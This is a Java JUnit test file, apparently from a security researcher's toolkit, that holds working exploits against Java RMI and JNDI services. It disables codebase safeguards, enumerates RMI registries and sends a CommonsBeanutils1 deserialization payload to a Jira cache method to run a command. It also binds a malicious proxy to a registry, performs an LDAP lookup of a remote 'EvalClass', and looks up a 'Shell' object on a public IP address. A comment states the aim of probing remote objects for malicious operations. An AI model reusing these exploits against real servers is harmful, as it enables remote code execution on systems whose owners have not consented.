package com.pinger.javasec;

import com.pinger.javasec.common.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.jupiter.api.Test;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.net.Socket;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.*;

/**
 * @author : p1n93r
 * @date : 2021/3/30 16:14
 * RMI相关测试
 */
public class RmiTest {

    @Test
    public void testSocket(){
        Socket socket = null;
        byte b[] = new byte[1024];
        int len = 0;
        int temp = 0; //全部读取的内容都使用temp接收
        try {
            socket = new Socket("127.0.0.1", 40001);
            socket.setSoTimeout(5);
            OutputStream outputStream = socket.getOutputStream();
            byte[] bytes = {(byte) 0x4a,(byte)0x52,(byte)0x4d,(byte)0x49,(byte)0x00,(byte)0x02,(byte)0x4b};
            outputStream.write(bytes);
            InputStream in = socket.getInputStream();
            while ((temp = in.read()) != -1) { //当没有读取完时，继续读取
                b[len] = (byte) temp;
                len++;
            }
            in.close();
            outputStream.flush();
            outputStream.close();
        } catch (IOException e) {
            System.out.println("当前读取到的数据如下：");
            System.out.println(new String(b, 0, len));
            e.printStackTrace();
        }
    }



    @Test
    public void test0() throws Exception{
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String[] list = Naming.list("rmi://127.0.0.1:40001");
        for (String s : list) {
            System.out.println(s);
        }
    }




    @Test
    public void test1() throws Exception{
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String[] list = Naming.list("rmi://127.0.0.1:40001");
        ArrayList<Object> rmiObjs = new ArrayList<>();
        for (String s : list) {
            System.out.println(s);
            Remote current = Naming.lookup("rmi:" + s);
            rmiObjs.add(current);
        }

        rmiObjs.forEach(v->{



//            System.out.println(v.toString());
//            Class<?> clazz = v.getClass();
//            Method remove = null;
//            try {
//                remove = clazz.getDeclaredMethod("test");
//                remove.setAccessible(true);
//                Object invoke = remove.invoke(v);
//                System.out.println(invoke);
//            } catch (NoSuchMethodException e) {
//                e.printStackTrace();
//            } catch (IllegalAccessException e) {
//                e.printStackTrace();
//            } catch (InvocationTargetException e) {
//                e.printStackTrace();
//            }

            // TODO:探测远程对象的方法，进行恶意操作
        });
    }


    @Test
    public void test2() throws Exception{
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        Object object = Naming.lookup("//127.0.0.1:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey");
        System.out.println(object);
        Class<?> clazz = object.getClass();
        Method targetObject = clazz.getDeclaredMethod("getQuiet", Serializable.class);
        targetObject.setAccessible(true);
        Object exp = CommonsBeanutils1.getPayload("calc");
        Object invoke = targetObject.invoke(object, exp);
        System.out.println(invoke);
    }


    @Test
    public void test3() throws Exception{
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
//        Object object = Naming.lookup("rmi://49.234.105.98/Shell");

        LocateRegistry.getRegistry("49.234.105.98").lookup("Shell").getClass();
//        System.out.println(object);
    }


    @Test
    public void test4() throws Exception{

        Map<String, Object> map = new HashMap<String, Object>();
        Constructor cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        cl.setAccessible(true);
        // 实例化一个Remote.class的代理
        InvocationHandler hl = (InvocationHandler)cl.newInstance(Override.class, map);
        Object object = Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, hl);
        Remote remote = Remote.class.cast(object);

        try {
            Registry registry=LocateRegistry.getRegistry("127.0.0.1",40001);
            registry.bind("test", remote);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }


    }






    @Test
    public void test() throws Exception{
//        reg.bind("Hello1111111111111111111111111",proxy);
    }


    private class EXPObject {
        {
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }


    @Test
    public void testJNDI() throws Exception{
        String url = "ldap://127.0.0.1:1099/EvalClass";
        Context ctx = new InitialContext();
        ctx.lookup(url);
    }



}
